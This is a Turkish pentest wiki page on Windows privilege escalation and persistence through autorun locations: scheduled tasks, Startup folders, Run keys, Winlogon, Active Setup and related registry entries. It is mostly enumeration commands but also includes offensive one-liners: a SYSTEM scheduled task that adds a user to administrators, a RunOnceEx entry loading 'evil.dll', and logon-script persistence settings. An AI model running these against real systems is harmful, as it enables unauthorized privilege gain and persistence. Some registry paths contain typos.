# Autoruns ile Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic**, **başlangıçta** programları çalıştırmak için kullanılabilir. Başlangıçta çalışacak şekilde ayarlanmış ikili dosyaları görmek için:

```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

## Zamanlanmış Görevler

**Görevler**, **belirli bir sıklıkta** çalışacak şekilde zamanlanabilir. Hangi binary'lerin çalışacak şekilde zamanlandığını görmek için aşağıdaki komutları kullanın:

```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```

SYSTEM olarak çalışan etkin bir görev, görev tanımı ve eylem dosyası korumalı olsa bile incelenmelidir. [Task Scheduler, görevin isteğe bağlı olarak çalıştırılması için görev üzerinde yürütme izni gerektirir](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks). Düşük ayrıcalıklı bir kullanıcının bu izni varsa, görevin tam olarak hangi eylemi gerçekleştirdiğini inceleyin; özellikle Active Directory ACL’lerini değiştiren veya hesap koruma ayarlarını sıfırlayan PowerShell script’lerini kontrol edin. Görevin `AllowDemandStart` ayarını kontrol edin ve script’in girdilerini ve etkilerini doğrulayın; yalnızca sabit bir görevi başlatma izni olması, keyfi kod yürütme olanağı sağlamaz.

## Klasörler

**Startup klasörlerinde** bulunan tüm binary’ler başlangıçta çalıştırılır. Yaygın Startup klasörleri aşağıda listelenmiştir, ancak Startup klasörü registry’de belirtilir. [Konumunu öğrenmek için burayı okuyun.](privilege-escalation-with-autorun-binaries.md#startup-path)

```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```

Daha yüksek ayrıcalıklı bir kullanıcının Startup girdisi, başka bir kullanıcının yazabildiği bir dizindeki dosyaları tekrar tekrar açan korumalı bir script'i başlatıyor olabilir. Bu dizini bir ayrıcalık yükseltme yolu olarak değerlendirmeden önce girdinin **gerçek oturum açma kimliğini**, script'in girdi dizinini ve ACL'lerini, ayrıca yapılan işlemin tam olarak ne olduğunu inceleyin. Özellikle [`hh.exe` derlenmiş HTML Help (`.chm`) dosyalarını açar](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/about-the-html-help-executable-program); kullanıcı tarafından sağlanan dosyaları bu programa ileten bir script, dosya adını veya ilk baytları kontrol etse bile içerik güven sınırını aşar. [HTML Help ilkeleri yürütülebilir kısayolları kısıtlayabilir](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/system-policies-for-shortcut-and-winhelp-commands); bu nedenle yüklü ilkeyi ve erişilebilir içeriğin davranışını doğrulayın. Tek başına `.chm` uzantısı veya magic bytes, daha yüksek ayrıcalıklı kod yürütüldüğünü kanıtlamaz. Sayım sırasında güvenilmeyen dosyayı açmadan autorun girdisini, süreç komut satırını ve yol izinlerini inceleyin.

Aynı içerik sınırı, daha yüksek ayrıcalıklı bir kişi başka bir kullanıcının değiştirebildiği bir documentation klasöründen `.chm` dosyasını **elle açtığında** da geçerlidir. Dosyanın kendisi ve üst dizini için yazma izinlerini, görüntüleyicinin gerçek kimliğini ve açma olayını, ayrıca etkin HTML Help ilkesini doğrulayın. Bir klasörün yazılabilir olması veya documentation inceleme isteği, yüksek ayrıcalıklı kimliğin saldırgan tarafından kontrol edilen içeriği açtığını göstermez.

> **Bilginize**: Arşiv çıkarma *path traversal* açıkları (örneğin WinRAR'da 7.13 öncesinde kötüye kullanılan CVE-2025-8088), decompression sırasında payload'ları doğrudan bu Startup klasörlerine **bırakmak** için kullanılabilir; bu da bir sonraki kullanıcı oturum açışında kod yürütülmesine yol açar. Bu tekniğin ayrıntılı incelemesi için:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Buradaki not](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): **Wow6432Node** registry girdisi, 64 bit Windows sürümü kullandığınızı gösterir. İşletim sistemi bu anahtarı, 64 bit Windows sürümlerinde çalışan 32 bit uygulamalar için HKEY_LOCAL_MACHINE\SOFTWARE'nin ayrı bir görünümünü sunmak üzere kullanır.

### Runs

**Yaygın olarak bilinen** AutoRun registry girdileri:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

**Run** ve **RunOnce** olarak bilinen registry anahtarları, kullanıcı sisteme her oturum açtığında programları otomatik olarak çalıştırmak üzere tasarlanmıştır. Anahtarın veri değeri olarak atanan komut satırı 260 karakteri aşamaz.<sup>[[2]](#references)</sup>

**Service runs** (önyükleme sırasında hizmetlerin otomatik başlatılmasını denetleyebilir):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Windows Vista ve sonraki sürümlerde **Run** ve **RunOnce** registry anahtarları otomatik olarak oluşturulmaz. Bu anahtarlardaki girdiler programları doğrudan başlatabilir veya bunları bağımlılık olarak belirtebilir. Örneğin, oturum açılışında bir DLL dosyası yüklemek için **RunOnceEx** registry anahtarıyla birlikte bir "Depend" anahtarı kullanılabilir. Bu, sistem başlangıcında "C:\temp\evil.dll" dosyasını çalıştıracak bir registry girdisi eklenerek gösterilmiştir:<sup>[[2]](#references)</sup>

```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```

> [!TIP]
> **Exploit 1**: **HKLM** içindeki belirtilen kayıt defteri girdilerinden herhangi birine yazabiliyorsanız, farklı bir kullanıcı oturum açtığında yetkilerinizi yükseltebilirsiniz.

> [!TIP]
> **Exploit 2**: **HKLM** içindeki kayıt defteri girdilerinde belirtilen ikili dosyalardan herhangi birinin üzerine yazabiliyorsanız, farklı bir kullanıcı oturum açtığında bu ikili dosyayı bir backdoor ile değiştirebilir ve yetkilerinizi yükseltebilirsiniz.

```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```

### Başlangıç Yolu

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

**Startup** klasörüne yerleştirilen kısayollar, kullanıcı oturum açtığında veya sistem yeniden başlatıldığında hizmetlerin ya da uygulamaların otomatik olarak başlatılmasını sağlar. **Startup** klasörünün konumu, hem **Local Machine** hem de **Current User** kapsamları için kayıt defterinde tanımlanır. Bu nedenle belirtilen **Startup** konumlarına eklenen herhangi bir kısayol, bağlantılı hizmetin veya programın oturum açma ya da yeniden başlatma işleminin ardından başlatılmasını sağlar. Bu da programların otomatik olarak çalışmasını zamanlamanın kolay bir yoludur.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> **HKLM** altındaki herhangi bir [User] Shell Folder'ın üzerine yazabilirseniz, onu sizin kontrol ettiğiniz bir klasöre yönlendirebilir ve kullanıcı sisteme her giriş yaptığında çalıştırılarak ayrıcalıkları yükselten bir backdoor yerleştirebilirsiniz.

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```

### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Bu kullanıcıya özel registry değeri, kullanıcı oturum açtığında çalıştırılacak bir script veya komutu gösterebilir. Yalnızca etkilenen kullanıcının bağlamında çalıştığı için temel olarak bir **persistence** aracıdır; ancak post-exploitation ve autoruns incelemeleri sırasında yine de kontrol edilmelidir.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Geçerli kullanıcı için bu değere yazabiliyorsanız, admin haklarına gerek kalmadan bir sonraki etkileşimli oturum açmada çalışmayı yeniden tetikleyebilirsiniz. Başka bir kullanıcının hive’ına yazabiliyorsanız, o kullanıcı oturum açtığında kod çalıştırma elde edebilirsiniz.

```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```

Notlar:

- Hedef kullanıcı tarafından zaten okunabilen `.bat`, `.cmd`, `.ps1` veya diğer launcher dosyaları için tam yolları tercih edin.
- Değer kaldırılana kadar bu yöntem oturum kapatıp yeniden başlatma sonrasında da etkili olur.
- `HKLM\...\Run` değerinden farklı olarak, bu yöntem tek başına yükseltilmiş ayrıcalık sağlamaz; kullanıcı kapsamlı kalıcılık sağlar.

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Genellikle **Userinit** anahtarı **userinit.exe** olarak ayarlanır. Ancak bu anahtar değiştirilirse belirtilen executable, kullanıcı oturum açtığında **Winlogon** tarafından da başlatılır. Benzer şekilde, **Shell** anahtarının **explorer.exe** dosyasını göstermesi amaçlanır; bu, Windows'un varsayılan shell'idir.<sup>[[1]](#references)</sup>

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```

> [!TIP]
> Registry değerinin veya binary'nin üzerine yazabilirseniz, yetkilerinizi yükseltebilirsiniz.

### İlke Ayarları

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

**Run** anahtarını kontrol edin.

```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```

### AlternateShell

### Güvenli Mod Komut İstemi'ni Değiştirme

Windows Registry'de `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` altında, varsayılan olarak `cmd.exe` değerine ayarlanmış bir **`AlternateShell`** değeri bulunur. Bu, başlangıç sırasında F8'e basıp "Güvenli Mod with Command Prompt" seçeneğini seçtiğinizde `cmd.exe`'nin kullanıldığı anlamına gelir. Ancak F8'e basıp bu seçeneği elle seçmeniz gerekmeksizin bilgisayarınızı otomatik olarak bu modda başlatacak şekilde yapılandırmanız mümkündür.

"Güvenli Mod with Command Prompt" modunda otomatik başlatma için bir önyükleme seçeneği oluşturma adımları:<sup>[[5]](#references)</sup>

1. Salt okunur, sistem ve gizli özniteliklerini kaldırmak için `boot.ini` dosyasının özniteliklerini değiştirin: `attrib c:\boot.ini -r -s -h`
2. `boot.ini` dosyasını düzenlemek üzere açın.
3. Şu satıra benzer bir satır ekleyin: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Değişiklikleri `boot.ini` dosyasına kaydedin.
5. Dosyanın özgün özniteliklerini yeniden uygulayın: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** **AlternateShell** Registry key'ini değiştirmek, yetkisiz erişim için kullanılabilecek özel bir komut shell'i yapılandırmaya olanak tanır.
- **Exploit 2 (PATH Write Permissions):** Sistem **PATH** değişkeninin herhangi bir bölümünde, özellikle `C:\Windows\system32` öncesinde yazma izinlerine sahip olmak, özel bir `cmd.exe` çalıştırmanıza olanak tanır. Sistem Güvenli Mod'da başlatılırsa bu bir backdoor olarak kullanılabilir.
- **Exploit 3 (PATH and boot.ini Write Permissions):** `boot.ini` dosyasına yazma erişimi, Güvenli Mod'un otomatik başlatılmasını sağlar ve sonraki yeniden başlatmada yetkisiz erişimi kolaylaştırır.

Geçerli **AlternateShell** ayarını kontrol etmek için şu komutları kullanın:

```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```

### Kurulu Bileşen

Active Setup, Windows'ta **masaüstü ortamı tamamen yüklenmeden önce başlatılan** bir özelliktir. Kullanıcı oturum açma işlemi devam etmeden önce tamamlanması gereken belirli komutların yürütülmesine öncelik verir. Bu işlem, Run veya RunOnce kayıt defteri bölümlerindekiler gibi diğer başlangıç girdileri tetiklenmeden önce gerçekleşir.

Active Setup şu kayıt defteri anahtarları üzerinden yönetilir:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Bu anahtarların altında, her biri belirli bir bileşene karşılık gelen çeşitli alt anahtarlar bulunur. Özellikle önemli olan anahtar değerleri şunlardır:

- **IsInstalled:**
  - `0`, bileşenin komutunun yürütülmeyeceğini belirtir.
  - `1`, komutun her kullanıcı için bir kez yürütüleceği anlamına gelir; `IsInstalled` değeri yoksa varsayılan davranış budur.
- **StubPath:** Active Setup tarafından yürütülecek komutu tanımlar. `notepad` başlatmak gibi geçerli herhangi bir komut satırı olabilir.

**Güvenlik Bilgileri:**

- Belirli bir **`StubPath`** değerine sahip ve **`IsInstalled`** değeri `"1"` olarak ayarlanmış bir anahtarı değiştirmek veya bu anahtara yazmak, yetkisiz komut yürütülmesine ve potansiyel olarak ayrıcalık yükseltmeye yol açabilir.
- Yeterli izinlere sahip olunduğunda, herhangi bir **`StubPath`** değerinin başvurduğu ikili dosyayı değiştirmek de ayrıcalık yükseltme sağlayabilir.

Active Setup bileşenlerindeki **`StubPath`** yapılandırmalarını incelemek için şu komutlar kullanılabilir:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```

### Browser Helper Objects

### Browser Helper Objects (BHOs) Genel Bakış

Browser Helper Objects (BHOs), Microsoft Internet Explorer'a ek özellikler kazandıran DLL modülleridir. Her başlatıldığında Internet Explorer ve Windows Explorer'a yüklenirler. Ancak **NoExplorer** anahtarı 1 olarak ayarlanarak çalıştırılmaları engellenebilir; böylece Windows Explorer örnekleriyle yüklenmezler.<sup>[[1]](#references)</sup>

BHOs, Internet Explorer 11 aracılığıyla Windows 10 ile uyumludur ancak Windows'un daha yeni sürümlerinde varsayılan tarayıcı olan Microsoft Edge'de desteklenmez.

Bir sistemde kayıtlı BHOs'ları incelemek için aşağıdaki kayıt defteri anahtarlarını kontrol edebilirsiniz:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Her BHO, kayıt defterinde benzersiz bir tanımlayıcı görevi gören **CLSID** ile temsil edilir. Her CLSID hakkındaki ayrıntılı bilgiler `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` altında bulunabilir.

Kayıt defterindeki BHOs'ları sorgulamak için şu komutlar kullanılabilir:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```

### Internet Explorer Eklentileri

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Kayıt defterinde her DLL için yeni bir kayıt bulunacağını ve bunun **CLSID** ile gösterileceğini unutmayın. CLSID bilgilerini `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` konumunda bulabilirsiniz.

### Yazı Tipi Sürücüleri

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```

### Açma Komutu

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`

```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```

### Bağlam menüsü COM işleyicileri

Explorer bağlam menüsü işleyicileri, `HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers` ve `HKLM\SOFTWARE\Classes\Folder\shellex\ContextMenuHandlers` gibi anahtarlar altında kayıtlı shell extension'lardır. Bir işleyicinin varsayılan değeri veya bazen anahtar adı bir CLSID'dir. Bu CLSID'yi `HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32` anahtarına kadar izleyin; buradaki varsayılan değer, işleyici çağrıldığında yüklenen DLL'yi belirtir.

```powershell
reg query "HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers" /s
reg query "HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32" /ve
Get-Acl 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32' |
  Select-Object -ExpandProperty Access
```

32-bit ve 64-bit registry görünümlerinin ikisini de kontrol edin. `HKCR`, kullanıcıya özel ve makine genelindeki class kayıtlarını birleştirir; bu nedenle bir process'in hangi temel key'i çözeceğini doğrulayın. Makine genelindeki bir `InprocServer32` değerini değiştirebilen düşük ayrıcalıklı bir identity, daha yüksek ayrıcalıklı bir process'i başka bir DLL'e yönlendirebilir; ancak privilege escalation için bu process'in handler'ı çağırması gerekir. Registry değerinin kendisi korumalı olsa bile yazılabilir bir DLL path'i benzer bir risk oluşturabilir.

### Image File Execution Options

```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```

## SysInternals

Autorun'ları bulabileceğiniz tüm konumların [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) tarafından **zaten tarandığını** unutmayın. Ancak, **otomatik çalıştırılan dosyaların** daha kapsamlı bir listesi için systinternals'tan [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) aracını kullanabilirsiniz:

```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```

## Daha Fazlası

**Daha fazla Autoruns benzeri registry girdisini şu adreste bulun:** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## References

- [1] [Yaygın malware persistence mekanizmaları](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Boot or Logon Initialization Scripts: Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Otomatik başlatma kategorileri (Windows Sysinternals Araçlarıyla Sorun Giderme, 2. Baskı)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [Alternatif bir shell başlatan önyükleme seçeneğini nasıl ekleyebilirim?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Metasploit Haftalık Özeti 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)
{{#include ../../banners/hacktricks-training.md}}
